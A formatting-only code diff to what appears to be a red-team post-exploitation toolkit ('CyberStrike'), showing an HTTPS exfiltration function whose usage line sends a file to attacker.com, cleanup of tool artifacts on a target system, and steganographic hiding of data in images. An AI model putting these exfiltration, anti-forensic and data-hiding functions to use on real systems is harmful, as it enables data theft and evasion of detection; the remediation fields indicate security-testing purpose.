@@ -357,7 +357,9 @@ export async function httpsExfil(args: string[], timeout: number): Promise<HookR
   const method = argVal(args, "--method") || "POST"
 
   if (!url || !dataFile) {
-    output.push("Usage: linuxhook https_exfil --url https://attacker.com/upload --data-file /path/to/file [--method POST|PUT]")
+    output.push(
+      "Usage: linuxhook https_exfil --url https://attacker.com/upload --data-file /path/to/file [--method POST|PUT]",
+    )
     return { output: output.join("\n"), findings }
   }
 
@@ -586,7 +588,9 @@ echo "Artifacts cleaned: $CLEANED"
     status: dryRun ? "DRY_RUN" : "CLEANED",
     resource: "system",
     title: dryRun ? "Cleanup dry run completed" : "CyberStrike artifacts cleaned",
-    details: dryRun ? "Dry run — no changes made. Review output for artifacts that would be removed." : `${cleaned} artifact(s) removed from target system`,
+    details: dryRun
+      ? "Dry run — no changes made. Review output for artifacts that would be removed."
+      : `${cleaned} artifact(s) removed from target system`,
     remediation: "Always run cleanup before exiting a target. Use --dry-run first to review.",
   })
 
@@ -664,7 +668,10 @@ echo "=== Total artifacts found: $TOTAL ==="
     status: total > 0 ? "FOUND" : "CLEAN",
     resource: "system",
     title: total > 0 ? `${total} CyberStrike artifact(s) detected` : "No artifacts found",
-    details: total > 0 ? `${total} artifact(s) found on system — run cleanup_linux to remove` : "System appears clean of CyberStrike artifacts",
+    details:
+      total > 0
+        ? `${total} artifact(s) found on system — run cleanup_linux to remove`
+        : "System appears clean of CyberStrike artifacts",
     remediation: "Run cleanup_linux (or cleanup_linux --dry-run first) to remove all artifacts before exiting.",
   })
 
@@ -742,7 +749,8 @@ echo "[*] The image still opens normally in viewers"
       resource: coverImage,
       title: "Steganographic file created",
       details: `Data from ${dataFile} hidden inside ${coverImage} — file appears normal to viewers`,
-      remediation: "Monitor for file size anomalies. Use steganography detection tools. Check file signatures vs actual content.",
+      remediation:
+        "Monitor for file size anomalies. Use steganography detection tools. Check file signatures vs actual content.",
     })
   }
 
